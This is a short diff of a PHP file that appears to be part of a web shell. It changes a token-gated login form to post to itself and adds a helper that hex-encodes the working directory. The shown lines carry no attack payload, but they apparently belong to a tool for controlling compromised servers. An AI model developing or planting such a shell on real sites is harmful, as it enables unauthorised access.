@@ -55,7 +55,7 @@ if(!function_exists('auth')){
 		<body style='background:#f8f8f8;color:#000000;padding:0;margin:0;'><br><p><center><noscript>You need to enable javascript</noscript></center></p>
 		<script type='text/javascript'>
 		var d = document;
-		d.write(\"<br><br><form method='post'><center><input type='password' id='token' name='token' style='font-size:34px;width:34%;outline:none;text-align:center;background:#ffffff;padding:8px;border:1px solid #cccccc;border-radius:8px;color:#000000;'></center></form>\");
+		d.write(\"<br><br><form method='post' action='".get_self()."'><center><input type='password' id='token' name='token' style='font-size:34px;width:34%;outline:none;text-align:center;background:#ffffff;padding:8px;border:1px solid #cccccc;border-radius:8px;color:#000000;'></center></form>\");
 		d.getElementById('token').focus();
 		d.getElementById('token').setAttribute('autocomplete', 'off');
 		</script>
@@ -1085,6 +1085,12 @@ if(!function_exists('endsWith')) {
     function endsWith($str, $needle){
         $length = strlen($needle);
         return $length === 0 || (substr($str, -$length) === $needle);
+    }
+}
+
+if(!function_exists('encode_cwd')) {
+    function encode_cwd($cwd) {
+        return bin2hex(from_encode($cwd));
     }
 }
 
